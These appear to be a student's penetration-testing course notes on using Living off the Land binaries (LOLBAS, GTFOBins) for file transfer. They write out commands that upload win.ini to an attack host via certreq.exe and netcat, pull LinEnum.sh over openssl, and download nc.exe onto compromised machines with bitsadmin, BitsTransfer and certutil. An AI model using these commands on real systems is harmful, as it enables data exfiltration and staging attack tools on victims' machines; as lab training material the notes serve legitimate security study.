Two websites that aggregate information on Living off the Land binaries:
- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries]()

Living off the Land Binaries can perform the following actions:
- download
- upload
- command execution
- file read/write
- bypasses

**LOLBAS**
To search for download and upload functions in LOLBAS we can use /download or /upload

![[Pasted image 20230830034543.png]]

Example: using CertReq.exe to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.

**Upload win.ini to our Pwnbox**
```
certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
```
	NOTE: This will send the file to our Netcat listening session, and we can copy-paste its     contents

**File Received in our Netcat Session**
```
sudo nc -lvnp 80
```

**GTFOBins**
To search for the download and upload function in GTFOBins for Linux Binaries, we can use +file download or +file upload.

![[Pasted image 20230830035116.png]]

For this example, we'll use OpenSSL as it can be used to send files similarly to netcat/nc

**Create Certificate in our Pwnbox**
```
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

**Stand up the Server in our Pwnbox**
```
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

**Download File from the Compromised Machine**
```
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### Other Common Living off the Land tools

**Bitsadmin Download function**
The Background Intelligent Transfer Service (BITS) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work

**File Download with Bitsadmin**
```
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

**Download**
```
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

**Certutil**
Can be used to download files on Windows machines. 
```
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

